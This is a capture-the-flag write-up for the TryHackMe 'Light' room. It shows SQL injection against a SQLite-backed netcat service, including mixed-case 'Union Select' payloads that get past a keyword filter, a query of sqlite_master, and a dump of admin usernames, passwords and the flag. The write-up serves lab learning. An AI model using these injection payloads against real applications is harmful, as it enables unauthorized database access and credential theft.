Welcome to the Light database application!

![](../Assets/Light/bulb.png)
> **Challenge Info**
> 
> Platform: TryHackMe
> 
> Category: Database
> 
> CTF Link: https://tryhackme.com/room/lightroom
# Analysis
I connect to the app:
```
┌──(kali㉿kali)-[~/Light]
└─$ ncat 10.112.180.128 1337
Welcome to the Light database!
Please enter your username:
```

I try to input `smokey` as the challenge description suggested:
```
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```

And it spits back a password. I try again with a couple other ones:
```
Please enter your username: admin
Username not found.
Please enter your username: root
Username not found.
Please enter your username: owner
Username not found.
```
But to no avail.
# SQL Injection
Let's check if we can do a SQL injection:
```
Please enter your username: ' UNION SELECT 1 --
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

Ok, different comment then:
```
Please enter your username: ' UNION SELECT 1 #
Ahh there is a word in there I don't like :(
```

It is probably filtering out `UNION` and `SELECT`, let's try to change the capitalization:
```
Please enter your username: ' Union Select 1 #
Error: unrecognized token: "#"
```

Ok, no comment then?
```
Please enter your username: ' Union Select 1
Error: unrecognized token: "' LIMIT 30"
```

It looks like there is a string that needs to be closed, let's add `'` to the end:
```
Please enter your username: ' Union Select 1 '
Password: 1
```

And there we go. Next I try a couple different version functions until I land on:
```
Please enter your username: ' Union Select sqlite_version() '
Password: 3.31.1
```
So the app is running on SQLite 3.31.1

Next I query `sqlite_master` to find out more about the database:
```
Please enter your username: ' Union Select group_concat(sql) FROM sqlite_master '
Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER),CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```
With that info I can check out users in the `admintable`: 
```
Please enter your username: ' Union Select group_concat(username) from admintable '
Password: TryHackMeAdmin,flag
```

And get their passwords:
```
Please enter your username: ' Union Select group_concat(password) from admintable '
Password: mamZtAuMlrsEy5bp6q17,THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```